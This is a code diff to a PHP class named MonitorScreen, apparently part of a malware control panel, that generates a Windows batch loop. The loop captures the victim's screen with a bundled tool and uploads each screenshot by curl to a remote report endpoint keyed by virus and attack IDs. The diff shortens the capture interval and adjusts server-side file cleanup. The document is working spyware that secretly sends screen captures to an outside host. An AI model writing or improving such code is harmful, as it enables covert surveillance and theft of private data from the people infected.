@@ -29,8 +29,9 @@ class MonitorScreen extends AttackBase {
         return $this->events;
     }
 
-    public function saveEventFromIntercept(int $unixTime) {
+    public function saveEventFromIntercept(int $unixTime): MonitorScreen {
         $this->events[$unixTime] = "";
+        return $this;
     }
 
     public function updateEventFromController(string $jsonEvent, string $unixTime):MonitorScreen {
@@ -55,7 +56,7 @@ class MonitorScreen extends AttackBase {
         if not exist "%~pd0..\..\utils\scst.exe" (exit /b 0)
         "%~pd0..\..\utils\scst.exe" "%~pd0screen.<?php echo Screenshot::$IMG_EXTENSION; ?>"
         curl --form "screen=@%~pd0screen.<?php echo Screenshot::$IMG_EXTENSION; ?>" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report\n"; ?>
-        timeout 3600
+        timeout 1200
         goto daemon_loop
         <?php
         //@formatter:on
@@ -83,7 +84,8 @@ class MonitorScreen extends AttackBase {
             if (in_array($unixTime, $this->savedEvents)) continue;
             if (time() - $unixTime > 24 * 60 * 60) {
                 unset($this->events[$unixTime]);
-                $filePath = DATA_FILE . "/attacks/" . $this->getAttackId() . "/screen-$unixTime.png";
+                $filePath = $mainSrc = DATA_DIR . "/attacks/" . $this->getAttackId() . "/screen-$unixTime.";
+                $filePath .= file_exists($filePath . Screenshot::$IMG_EXTENSION) ? Screenshot::$IMG_EXTENSION : "png";
                 $this->resetStaticUsage();
                 $this->usage()->minusDisk(filesize($filePath))->saveState();
                 $this->reportStaticUsage();
